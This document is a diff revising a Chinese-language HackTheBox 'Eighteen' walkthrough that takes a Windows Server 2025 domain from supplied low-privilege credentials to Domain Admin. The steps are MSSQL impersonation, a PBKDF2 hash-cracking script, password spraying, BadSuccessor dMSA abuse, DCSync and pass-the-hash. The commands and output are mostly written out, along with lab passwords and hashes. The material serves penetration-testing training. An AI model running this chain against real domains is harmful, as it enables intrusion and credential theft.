@@ -1,194 +1,131 @@
-# 侦察
-## 凭证
+# HackTheBox – Eighteen 靶场笔记  
 
-机器信息:
+---
 
-	像现实生活中常见的 Windows 渗透测试一样，你将使用以下账户凭证启动 Eighteen 盒子：kevin/iNa2we6haRj2gaw!
-#### 端口扫描
+## 0x00 侦察
 
-```
-$ nmap -sC -sV -vv -oA 10.129.156.245
+### 0x01 凭证
 
-Nmap scan report for 10.129.156.245
-Host is up, received echo-reply ttl 127 (0.32s latency).
-Scanned at 2025-11-15 14:03:28 EST for 57s
-Not shown: 998 filtered tcp ports (no-response)
-PORT     STATE SERVICE  REASON          VERSION
-80/tcp   open  http     syn-ack ttl 127 Microsoft IIS httpd 10.0
-| http-methods: 
-|_  Supported Methods: HEAD POST OPTIONS
-|_http-server-header: Microsoft-IIS/10.0
-|_http-title: Did not follow redirect to http://eighteen.htb/
-1433/tcp open  ms-sql-s syn-ack ttl 127 Microsoft SQL Server 2022 16.00.1000.00; RC0+
-|_ms-sql-ntlm-info: ERROR: Script execution failed (use -d to debug)
-|_ms-sql-info: ERROR: Script execution failed (use -d to debug)
-|_ssl-date: 2025-11-16T02:04:29+00:00; +7h00m04s from scanner time.
-| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
-| Issuer: commonName=SSL_Self_Signed_Fallback
-| Public Key type: rsa
-| Public Key bits: 3072
-| Signature Algorithm: sha256WithRSAEncryption
-| Not valid before: 2025-11-13T19:00:26
-| Not valid after:  2055-11-13T19:00:26
-| MD5:   44e1:e666:3f88:1148:9aa1:d47d:59d9:c214
-| SHA-1: 979a:ab38:dc01:51b4:4291:6200:eef1:f5a4:f4db:5f1f
-| -----BEGIN CERTIFICATE-----
-| MIIEADCCAmigAwIBAgIQbVFyufWkmY9KQvQXa0xRkDANBgkqhkiG9w0BAQsFADA7
-| MTkwNwYDVQQDHjAAUwBTAEwAXwBTAGUAbABmAF8AUwBpAGcAbgBlAGQAXwBGAGEA
-| bABsAGIAYQBjAGswIBcNMjUxMTEzMTkwMDI2WhgPMjA1NTExMTMxOTAwMjZaMDsx
-| OTA3BgNVBAMeMABTAFMATABfAFMAZQBsAGYAXwBTAGkAZwBuAGUAZABfAEYAYQBs
-| AGwAYgBhAGMAazCCAaIwDQYJKoZIhvcNAQEBBQADggGPADCCAYoCggGBALgj6Fxb
-| Zd8kZ+XtcQJNX1IQQ/bOFnOMu9hXOuqUGYVDQ79sf8Rk0lc5aZrE+3OrjixbEjvE
-| tw3DbkcT/hYc1QSQaCop/G4/SmpNoaagHfRRZIQ+ZhoBt6dSd9+hY9/ldcyDNk7J
-| Tk+8h2dB5oXRc6U61BxUffwbeYsEJZubsEv8TtBLdz9pbXF0UlU4uPQxMPYXdKuC
-| xIS1X1AVMXoPcc8ewT+qpU4GSsYlFsbOSrFYBgXgDZOXzBi2jrHxcR8tyafm4uIN
-| LzRHU46D2rxZrmDPi+QpfIYzROnhCZG3s8ORBwGUKR8mhdDzIGWq8o1qh5dwMjtY
-| ggLfXfUQg6YaMj3Glb8FRo8Uc+TSg6XYh2v6rQh0L2kHFj8UZqYWYNMFn6cJrQ84
-| iugDE/u/bxZXgudF/xA1uiAxbPG7Jx+JkJjB17zTleUPDWnVTncw0/jwC7e01Ugp
-| HeBytzARWPAXOmSgru+vhDtr9PT1zVQ0f/LfQJsTFj4t9iJtxVHav/48FQIDAQAB
-| MA0GCSqGSIb3DQEBCwUAA4IBgQAo1c9vzHy6ktF+EOvti9DBV/1TXJgX/748rMfe
-| n2E7SQX+YSPdszguAMWgLPu5H/8uBQQhB2Zv2gsOS98IYMu8DaowcHQABIUBCWKj
-| 4zsgzzsiBesYvqBMPOKahmMLdmxQd8zfKH9sfcsrMWahaLgFWarrd3EHLCNyNfZU
-| bNfQT2sDVFlw7k/XqTcbs61GtyQjwIkYrSskt86iqh0Khrs14n9HzxEGfz5zNaSE
-| P61z1apAD5dFkNZWL8RySBBP93Xk5WRAxVREkd1cjDNt007c/y0tUonfrghWufGt
-| Xdu4aYbdRHPmI6PInXbXg6Ed+MeHSz/P1ilpvder/uZ7tB/aoKGMF05Cm63tU4tw
-| GCmrEsLEtGNtFhPT25hCbh3wNbfWppj2qGgDO4h1SMrMVwlazVmvGGjIcVCm+ZSb
-| jELRKLD+hRqYXjPbU6G8C+rH1JuGPrIn1OpQsxYCRNlTkVSm0hQ9CxPO4yRvO/tY
-| 3paLzBAaqFXy7FHTgrr9L60vfIY=
-|_-----END CERTIFICATE-----
-Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+| 角色  | 用户名 | 密码               | 备注               |
+|-------|--------|--------------------|--------------------|
+| 初始 | kevin  | iNa2we6haRj2gaw!   | Windows 本地账户   |
 
-Host script results:
-|_clock-skew: 7h00m03s
-```
-- **域名**: `eighteen.htb`
-## 初始访问
+---
 
-### MSSQL 枚举
+### 0x02 端口扫描
 
-```
-$ nxc mssql eighteen.htb -u kevin -p 'iNa2we6haRj2gaw!' --rid-brute --local-auth
-
-MSSQL       10.129.122.5    1433   DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:eighteen.htb)
-MSSQL       10.129.122.5    1433   DC01             [+] DC01\kevin:iNa2we6haRj2gaw!
-MSSQL       10.129.122.5    1433   DC01             498: EIGHTEEN\Enterprise Read-only Domain Controllers
-MSSQL       10.129.122.5    1433   DC01             500: EIGHTEEN\Administrator
-MSSQL       10.129.122.5    1433   DC01             501: EIGHTEEN\Guest
-MSSQL       10.129.122.5    1433   DC01             502: EIGHTEEN\krbtgt
-MSSQL       10.129.122.5    1433   DC01             512: EIGHTEEN\Domain Admins
-MSSQL       10.129.122.5    1433   DC01             513: EIGHTEEN\Domain Users
-MSSQL       10.129.122.5    1433   DC01             514: EIGHTEEN\Domain Guests
-MSSQL       10.129.122.5    1433   DC01             515: EIGHTEEN\Domain Computers
-MSSQL       10.129.122.5    1433   DC01             516: EIGHTEEN\Domain Controllers
-MSSQL       10.129.122.5    1433   DC01             517: EIGHTEEN\Cert Publishers
-MSSQL       10.129.122.5    1433   DC01             518: EIGHTEEN\Schema Admins
-MSSQL       10.129.122.5    1433   DC01             519: EIGHTEEN\Enterprise Admins
-MSSQL       10.129.122.5    1433   DC01             520: EIGHTEEN\Group Policy Creator Owners
-MSSQL       10.129.122.5    1433   DC01             521: EIGHTEEN\Read-only Domain Controllers
-MSSQL       10.129.122.5    1433   DC01             522: EIGHTEEN\Cloneable Domain Controllers
-MSSQL       10.129.122.5    1433   DC01             525: EIGHTEEN\Protected Users
-MSSQL       10.129.122.5    1433   DC01             526: EIGHTEEN\Key Admins
-MSSQL       10.129.122.5    1433   DC01             527: EIGHTEEN\Enterprise Key Admins
-MSSQL       10.129.122.5    1433   DC01             528: EIGHTEEN\Forest Trust Accounts
-MSSQL       10.129.122.5    1433   DC01             529: EIGHTEEN\External Trust Accounts
-MSSQL       10.129.122.5    1433   DC01             553: EIGHTEEN\RAS and IAS Servers
-MSSQL       10.129.122.5    1433   DC01             571: EIGHTEEN\Allowed RODC Password Replication Group
-MSSQL       10.129.122.5    1433   DC01             572: EIGHTEEN\Denied RODC Password Replication Group
-MSSQL       10.129.122.5    1433   DC01             1000: EIGHTEEN\DC01$
-MSSQL       10.129.122.5    1433   DC01             1101: EIGHTEEN\DnsAdmins
-MSSQL       10.129.122.5    1433   DC01             1102: EIGHTEEN\DnsUpdateProxy
-MSSQL       10.129.122.5    1433   DC01             1601: EIGHTEEN\mssqlsvc
-MSSQL       10.129.122.5    1433   DC01             1602: EIGHTEEN\SQLServer2005SQLBrowserUser$DC01
-MSSQL       10.129.122.5    1433   DC01             1603: EIGHTEEN\HR
-MSSQL       10.129.122.5    1433   DC01             1604: EIGHTEEN\IT
-MSSQL       10.129.122.5    1433   DC01             1605: EIGHTEEN\Finance
-MSSQL       10.129.122.5    1433   DC01             1606: EIGHTEEN\jamie.dunn
-MSSQL       10.129.122.5    1433   DC01             1607: EIGHTEEN\jane.smith
-MSSQL       10.129.122.5    1433   DC01             1608: EIGHTEEN\alice.jones
-MSSQL       10.129.122.5    1433   DC01             1609: EIGHTEEN\adam.scott
-MSSQL       10.129.122.5    1433   DC01             1610: EIGHTEEN\bob.brown
-MSSQL       10.129.122.5    1433   DC01             1611: EIGHTEEN\carol.white
-MSSQL       10.129.122.5    1433   DC01             1612: EIGHTEEN\dave.green
+```bash
+nmap -sC -sV -vv -oA nmap 10.129.156.245
 ```
 
-#### SQL 身份验证（访客访问）
-```BASH
+**关键结果**
+
+| Port | Service | Version / Annotation |
+|------|---------|----------------------|
+| 80   | http    | Microsoft IIS 10.0 → 重定向到 `http://eighteen.htb/` |
+| 1433 | mssql   | Microsoft SQL Server 2022 (16.0.1000.0 RC0+) |
+
+**域名**：`eighteen.htb`
+
+---
+
+## 0x10 初始访问
+
+### 0x11 MSSQL 枚举（本地认证）
+
+```bash
+nxc mssql eighteen.htb -u kevin -p 'iNa2we6haRj2gaw!' \
+     --rid-brute --local-auth
+```
+
+**亮点**
+
+- 成功登录 `kevin`
+- RID 暴破得到大量域内用户 / 组（节选）
+
+```
+1601  mssqlsvc
+1603  HR
+1604  IT
+1605  Finance
+1606  jamie.dunn
+...
+```
+
+---
+
+### 0x12 游客连接 → 发现模拟权限
+
+```bash
 impacket-mssqlclient 'eighteen.htb/kevin:iNa2we6haRj2gaw!@10.129.24.98'
 ```
 
-**结果**：以 `guest` 身份连接，权限有限。
-#### 枚举登录
+**SQL 命令**
 
-```SQL
--- 检查当前用户
+```sql
+-- 查看当前身份
 SELECT SYSTEM_USER, USER_NAME();
 
--- 列出数据库
+-- 查数据库
 SELECT name FROM master.dbo.sysdatabases;
-```
-#### 发现模拟权限
 
-```SQL
-enum_impersonate
+-- 枚举可 impersonate 的登录
+enum_impersonate;          -- 发现可冒充 appdev
 ```
 
-**关键发现**：Kevin 可以假冒 `appdev` 登录!
-#### 模拟 appdev 并访问数据库
+---
 
-```SQL
--- 冒充 appdev
+### 0x13 模拟 appdev & 拖库
+
+```sql
 EXECUTE AS LOGIN = 'appdev';
 
--- 核实
-SELECT SYSTEM_USER, USER_NAME();
-
--- 访问 financial_planner 数据库
 USE financial_planner;
-
--- 列出表格
-SELECT name FROM sys.tables;
+SELECT name FROM sys.tables;   -- 发现 users 表
+SELECT * FROM users;           -- 拿到 PBKDF2 哈希
 ```
-### 提取用户凭证
 
-```SQL
-SELECT * FROM users;
-```
-### 破解密码哈希
+---
 
-创建了一个 Python 脚本来破解 Flask PBKDF2 哈希：
+### 0x14 破解 Flask 哈希
 
-```PYTHON
+**Python 多进程爆破脚本**（PBKDF2-SHA256, 600 000 rounds）
+
+```python
 #!/usr/bin/env python3
-import hashlib
-import gzip
-from multiprocessing import Pool, cpu_count
+import hashlib, gzip, multiprocessing as mp
 
-def check_password(args):
-    password, salt, iterations, target_hash = args
+def check(args):
+    pwd, salt, it, tgt = args
     try:
-        computed = hashlib.pbkdf2_hmac('sha256', password, salt.encode('utf-8'), iterations)
-        if computed.hex() == target_hash:
-            return password.decode('utf-8', errors='ignore')
-    except:
-        pass
+        if hashlib.pbkdf2_hmac('sha256', pwd, salt.encode(), it).hex() == tgt:
+            return pwd.decode(errors='ignore')
+    except: pass
     return None
 
-# Hash components
-salt = "<REDACTED_SALT>"
-iterations = 600000
-target_hash = "<REDACTED_HASH>"
+if __name__ == '__main__':
+    salt = '<REDACTED>'
+    iterations = 600_000
+    target = '<REDACTED_HASH>'
 
-# Run against rockyou.txt with multiprocessing
+    with gzip.open('rockyou.txt.gz', 'rb') as f:
+        passwords = [line.rstrip() for line in f]
+
+    with mp.Pool(mp.cpu_count()) as p:
+        for hit in p.imap_unordered(check,
+                                    ((p, salt, iterations, target) for p in passwords)):
+            if hit:
+                print('CRACKED:', hit)
+                break
 ```
 
-**破解密码**：iloveyou1
+**结果**：`iloveyou1`
 
-### 密码喷洒
+---
 
-但即使有管理员权限，这个 Web 应用也很简陋——没有暴露什么有趣的内容。
+### 0x15 密码喷洒 → WinRM Shell
 
-所以我们转向使用 Netexec 进行密码喷洒，目标是 RID 暴力枚举期间发现的用户账户。
-```BASH
+```bash
 cat > users.txt <<EOF
 jamie.dunn
 jane.smith
@@ -202,201 +139,115 @@ EOF
 nxc winrm eighteen.htb -u users.txt -p 'iloveyou1' --no-bruteforce
 ```
 
-我们通过 WinRM 以 adam.scott / iloveyou1 的方式实现了远程 shell 访问：
+**命中**：`adam.scott / iloveyou1` → `evil-winrm` 拿到普通 shell
 
-### 枚举
+---
 
-我们应该熟悉 Flask 应用——总是查找存储在 Flask 配置中的错误配置的数据库凭证。来自 `C:\inetpub\eighteen.htb\app.py`：
+## 0x20 横向移动
+
+### 0x21 Flask 源码里捡凭证
+
+**文件**：`C:\inetpub\eighteen.htb\app.py`
 
 ```python
 DB_CONFIG = {
-    'server': 'dc01.eighteen.htb',
-    'database': 'financial_planner',
-    'username': 'appdev',
-    'password': 'MissThisElite$90',
-    'driver': '{ODBC Driver 17 for SQL Server}',
-    'TrustServerCertificate': 'True'
+    'server'   : 'dc01.eighteen.htb',
+    'database' : 'financial_planner',
+    'username' : 'appdev',
+    'password' : 'MissThisElite$90',
+    ...
 }
 ```
 
-这给了我们直接以 `appdev` 身份访问 MSSQL 的权限，但不是用于内部 `mssqlsvc` 账户
+→ 直接拿到 `appdev` SQL 密码，但非 `mssqlsvc`
 
-我们可以使用 NetExec 通过这个 MSSQL 账户探测权限提升的向量：
+---
 
-没有发现从 MSSQL 立即提升权限的途径——但我们注意到 NetExec 的指纹信息：
-`Windows 11 / Server 2025 Build 26100`
-
-这是一个非常新的 Windows 版本，仍在开发中，可能容易受到新发布的漏洞攻击。
-
-### BloodHound
-
-在成功获取 MSF Shell 后，我们上传 SharpHound.ps1 来枚举域关系：
+### 0x22 BloodHound 一轮游
 
 ```powershell
+# 上传 SharpHound.ps1
 Import-Module .\SharpHound.ps1
-Invoke-BloodHound -CollectionMethod All -Domain eighteen.htb -DomainController "dc01.eighteen.htb" -zipFileName bh.zip
+Invoke-BloodHound -CollectionMethod All -Domain eighteen.htb \
+                  -DomainController dc01.eighteen.htb -zipName bh.zip
 ```
 
-下载生成的 ZIP 文件，并将其加载到 BloodHound 中以可视化域图：
+**结论**：暂无显性 AD 控制路径；需细粒度 ACL 审查。
 
-没有揭示直接的 AD 控制路径。因此，我们可以稍后使用 BloodyAD 或 PowerView 进行更细粒度的 ACE 检查，以发现隐藏的委派或配置错误的 DACLs。
+---
 
-#### BadSuccessor
+## 0x30 BadSuccessor（dMSA）提权
 
-- NetExec 将目标指纹识别为 Windows 11/Server 2025 版本 26100，该版本容易受到新发布漏洞的影响——这可能是由于该 Windows 预览版本中的功能尚未成熟和实验性所致。
+### 0x31 背景速读
 
-- 此外，我们观察到 `mssqlsvc` 账户作为一个常规的 AD 用户对象存在，并具有主目录——这一行为与现代 Active Directory 环境中典型服务账户配置有所不同。
+| 缩写 | 含义 |
+|------|------|
+| MSA  | 单机托管服务账户 |
+| gMSA | 组托管服务账户 |
+| dMSA | **委派托管服务账户**（Server 2025 新功能） |
 
-### dMSA 101
+**攻击核心**  
+若低权用户能在某 OU 创建 / 修改 dMSA 对象，即可将任意高权用户设为“前驱”，KDC 会视 dMSA 为“继承者” → 拿到高权 PAC。
 
-- MSA – 管理服务账户（单机）
+---
 
-- gMSA – 组管理服务账户（多台机器）
+### 0x32 指纹 & 前提验证
 
-然后 Windows Server 2025 引入了 dMSA——委托管理服务账户。他们想要解决的问题：
-
-- 用户倾向于使用老式的服务账户（普通的 AD 用户对象）在各个地方运行服务。
-
-- 用户通常希望将它们迁移到更安全的托管模式，同时不破坏一切。
-
-- 所以他们发明了 dMSA，并加入了迁移功能：
-
-	- 用户创建一个 dMSA，该 dMSA“继承”了一个现有的传统服务账户。
-
-	- 在后台，他们链接这两个账户，KDC 将 dMSA 视为继承者身份。
-
-在迁移过程中，从机械角度来看：
-
-- dMSA 对象获取属性，如：
-
-	- `msDS-ManagedAccountPrecededByLink` → 指向原始用户（前任）
-
-	- `msDS-DelegatedMSAState` → 迁移状态（准备中、已完成等）
-
-当设置正确时，DC 基本上会说：
-
-	“这个 dMSA 是那个旧账户的继任者；在认证方面，可以视它们为基本等同。”
-
-这个想法在理论上很好——比如在我们这个案例中，一个普通的 AD 用户 `mssqlsvc` 可以作为服务账户运行敏感权限，这很方便。但随后发生了 BadSuccessor 事件。
-
-### BadSuccessor 101
-
--  在 Windows Server 2025 域中，只要有一台运行该版本的 DC，dMSA 功能默认存在。
-
-- 如果攻击者可以：
-
-	- 创建或控制一个 dMSA 对象，并且
-
-	- 设置其部分属性（特别是“前驱”链接）
-
-- 他们可以欺骗 KDC，使其将那个 dMSA 视为任何目标账户（域管理员、域控制器等）的后继者。
-- 结果：
-
-	- dMSA 有效继承了目标的权限，
-
-	- 我们就能获取目标账户的 Kerberos 密钥/PAC。
-
-这意味着，只需极小的权限，我们就能提升到域中的任何主体。
-
-### POC
-
-BadSuccessor 仅在至少有一台运行 Windows Server 2025 的 DC 时才适用。已确认：
-
-```
-$ Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion' | Select-Object ProductName, ReleaseId, DisplayVersion, CurrentBuildNumber, UBR
+```powershell
+Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion'
 
 ProductName        : Windows Server 2025 Datacenter
-ReleaseId          : 2009
-DisplayVersion     : 24H2
 CurrentBuildNumber : 26100
-UBR                : 4349
 ```
 
-BadSuccessor 仅在低权限账户能够创建/修改 dMSA（或者至少在某些可以存放 dMSA 的 OU 上具有创建/写入权限）时才有效。我们可以在上传 PowerView.ps1 后创建一个 PowerShell 脚本：
+→ 存在 dMSA 功能。
 
-```POWERSHELL
+---
+
+### 0x33 查 ACL → 确认可写 OU
+
+```powershell
 Import-Module .\PowerView.ps1
-
 $me = Get-DomainUser -Identity (whoami)
 
-# Enumerate ACLs on OUs
-Get-DomainOU | ForEach-Object {
-    $ou = $_
-    Get-DomainObjectAcl -Identity $ou.DistinguishedName -ResolveGUIDs |
-        Where-Object {
-            $_.IdentityReference -eq $me.SID -and
-            ($_.ActiveDirectoryRights -match 'CreateChild|GenericAll|GenericWrite')
-        } |
-        Select-Object @{n='OU';e={$ou.Name}}, IdentityReference, ActiveDirectoryRights
+Get-DomainOU | %{
+    Get-DomainObjectAcl -Identity $_.DistinguishedName -ResolveGUIDs |
+        ?{ $_.IdentityReference -eq $me.SID -and
+           $_.ActiveDirectoryRights -match 'CreateChild|GenericAll|GenericWrite' } |
+        Select @{n='OU';e={$_.Name}}, IdentityReference, ActiveDirectoryRights
 }
 ```
 
-输出显示：
+**结果**
 
-- 在 `OU=Staff` 上：
+| OU               | 权限摘要 |
+|------------------|----------|
+| OU=Staff         | CreateChild + GenericAll + WriteDacl + WriteOwner |
+| OU=Domain Controllers | CreateChild + GenericAll |
 
-	- 作为 adam.scott ，我们有 CreateChild （很多条目）
+→ 满足利用条件。
 
-	- 还有 `GenericAll`
+---
 
-	- 甚至还有 `WriteDacl` ， `WriteOwner` 在同一行上
+### 0x34 隧道 + Kerberos 认证
 
-- 在 `OU=Domain Controllers` ：
-	- 我们还有 `CreateChild`
-	- 还有 `GenericAll` / `WriteDacl` / `WriteOwner`
-
-在这种情况下我们可以：
-- **创建一个 dMSA 对象**
-- **完全控制其属性和安全描述符**
-
-这正是 BadSuccessor dMSA 攻击需要的定位。
-
-### Kerberos 身份验证
-
-在我们的情况下，攻击路径被限制在 Kerberos 身份验证中。我们在运行 badsuccessor.py 时识别到这一限制——它因错误提示需要更强的身份验证（Kerberos 而不仅仅是 NTLM）而失败：
-
-有各种方法可以绕过这个限制。由于 Kerberos 认证在内部可以通过 localhost 进行，我们可以使用 Ligolo-ng 将 127.0.0.1 隧道传输到我们的攻击机器上：
-
-一旦隧道建立，我们便打开了内部 Kerberos 认证的大门。首先我们设置环境：
+因后续操作 **强制 Kerberos**，用 Ligolo-ng 把 127.0.0.1 隧道出来：
 
 ```bash
-# export ticket to use
-export KRB5CCNAME=adam.scott.ccache
-
-# generate krb5.conf
-./ft.sh 240.0.0.1 \
-nxc smb 240.0.0.1 -u adam.scott -p iloveyou1 --generate-krb5-file ./krb5.conf
-
-# export config
-export KRB5_CONFIG=krb5.conf
-```
-
-**错误应对措施： `KRB_AP_ERR_SKEW`**
-
-	Kerberos 不容忍时间漂移。如果由于时间偏差导致身份验证失败，可以使用 faketime 方法重新校准时间或者部署 shell 包装器（ft.sh）
-
-使用 Impacket 请求 TGT 进行测试：
-
-```bash
-# use getTGT.py to create a TGT
+# 1. 拿 TGT
 ./ft.sh 240.0.0.1 \
 getTGT.py eighteen.htb/'adam.scott:iloveyou1' -dc-ip 240.0.0.1
 
-# use the ticket
+# 2. 环境变量
 export KRB5CCNAME=adam.scott.ccache
+export KRB5_CONFIG=krb5.conf
 ```
 
-### 利用程序
+> 时间漂移用 `faketime` 修正，略。
 
-Akamai 博客提供了详细的利用步骤。我们参考官方的 [writeup]( https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory),并使用 GitHub 上的这个 PoC。
+---
 
-#### 查找可写入的 OU
-
-使用 `find` 命令再次确认我们可以写入特定的 OU：
-
-#### 创建恶意 dMSA
-
-现在创建一个恶意的 dMSA 来继承目标的权限：
+### 0x35 创建恶意 dMSA
 
 ```powershell
 .\BadSuccessor.exe escalate `
@@ -406,68 +257,61 @@ Akamai 博客提供了详细的利用步骤。我们参考官方的 [writeup]( h
 -dnshostname FinancialPlanning `
 -user adam.scott `
 -dc-ip 127.0.0.1
-
-# for cleanup
-# .\BadSuccessor.exe del web_svc "OU=STAFF,DC=eighteen,DC=htb"
 ```
 
-由于当前权限限制，我们只能针对 STAFF 组织单位进行操作：
+**生成属性**
 
-新创建的 dMSA： `web_svc` → 主机： `web_svc$` ，现在通过以下方式成为 Administrator 账户的继任者：
+```
+msDS-ManagedAccountPrecededByLink → Administrator
+msDS-DelegatedMSAState            → 2 (Ready)
+```
 
-- `msDS-ManagedAccountPrecededByLink = Administrator`
+→ `web_svc$` 现为 Administrator 的“继任者”。
 
-- `msDS-DelegatedMSAState = 2`
-#### 模拟
+---
 
-随着恶意 dMSA 的建立，我们现在可以使用标准的 Kerberos 模拟来提取凭证。尽管像 `Rubeus` 这样的工具在那些演示中引入使用，但我们的先前 `evil-winrm` 登录凭证（NTLM）在缓存票据方面往往存在问题——因此我们将完全从我们的隧道 Kerberos 工作站进行操作。
-
-运行 `getST.py` 针对提升后的后继对象 `web_svc$` :
+### 0x36 拿到提升 TGS & Dump Hash
 
 ```bash
+# 1. 申请 web_svc$ 的 TGS（含高权 PAC）
 ./ft.sh 240.0.0.1 \
 getST.py eighteen.htb/adam.scott \
-        -impersonate 'web_svc$' \
-        -self \
-        -dmsa \
-        -k -no-pass \
-        -dc-ip 240.0.0.1
-```
+        -impersonate 'web_svc$' -self -dmsa -k -no-pass -dc-ip 240.0.0.1
 
-### 哈希导出
+# 2. 导出 Administrator 哈希
+export KRB5CCNAME="web_svc\$@krbtgt_EIGHTEEN.HTB@EIGHTEEN.HTB.ccache"
 
-手持提升后的 TGS（与管理员关联），我们使用 secretsdump.py 导出哈希信息：
-
-```
-$ export KRB5CCNAME="web_svc\$@krbtgt_EIGHTEEN.HTB@EIGHTEEN.HTB.ccache"
-
-$ ./ft.sh 240.0.0.1 \
+./ft.sh 240.0.0.1 \
 secretsdump.py EIGHTEEN.HTB/web_svc\$@dc01.eighteen.htb \
-      -k -no-pass \
-      -dc-ip 240.0.0.1 \
-      -target-ip 240.0.0.1 \
+      -k -no-pass -dc-ip 240.0.0.1 -target-ip 240.0.0.1 \
       -just-dc-user Administrator
-  
-[*] Querying offset from: 240.0.0.1
-[*] faketime -f format: +25200.649301
-25200.649301s
-[*] Running: secretsdump.py EIGHTEEN.HTB/web_svc$@dc01.eighteen.htb -k -no-pass -dc-ip 240.0.0.1 -target-ip 240.0.0.1 -just-dc-user Administrator
-Impacket v0.14.0.dev0+20251107.4500.2f1d6eb2 - Copyright Fortra, LLC and its affiliated companies
-
-[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
-[*] Using the DRSUAPI method to get NTDS.DIT secrets
-Administrator:500:aad3b435b51404eeaad3b435b51404ee:0b133be956bfaddf9cea56701affddec:::
-[*] Kerberos keys grabbed
-Administrator:0x14:977d41fb9cb35c5a28280a6458db3348ed1a14d09248918d182a9d3866809d7b
-Administrator:0x13:5ebe190ad8b5efaaae5928226046dfc0
-Administrator:aes256-cts-hmac-sha1-96:1acd569d364cbf11302bfe05a42c4fa5a7794bab212d0cda92afb586193eaeb2
-Administrator:aes128-cts-hmac-sha1-96:7b6b4158f2b9356c021c2b35d000d55f
-Administrator:0x17:0b133be956bfaddf9cea56701affddec
-[*] Cleaning up...
 ```
 
-然后执行 PTH 会话
+**输出**
+
+```
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:0b133be956bfaddf9cea56701affddec:::
+```
+
+---
+
+### 0x37 PTH 登录 = SYSTEM 级 shell
 
 ```bash
-evil-winrm -i dc01.eighteen.htb -u administrator -H 0b133be956bfaddf9cea56701affddec
+evil-winrm -i dc01.eighteen.htb -u administrator \
+           -H 0b133be956bfaddf9cea56701affddec
 ```
+
+---
+
+## 0xFF 总结
+
+1. 端口扫描 → IIS + MSSQL  
+2. MSSQL 游客登录 → 发现可 impersonate `appdev`  
+3. 拖库 → 破解 Flask PBKDF2 → 拿到 `iloveyou1`  
+4. 密码喷洒 → WinRM 拿到 `adam.scott` 会话  
+5. PowerView + ACL 枚举 → 确认可在 **STAFF/DC OU** 创建 dMSA  
+6. BadSuccessor 创建恶意 dMSA → 继承 Administrator  
+7. Kerberos 隧道 → TGS → DCSync → PTH → **域管**
+
+---
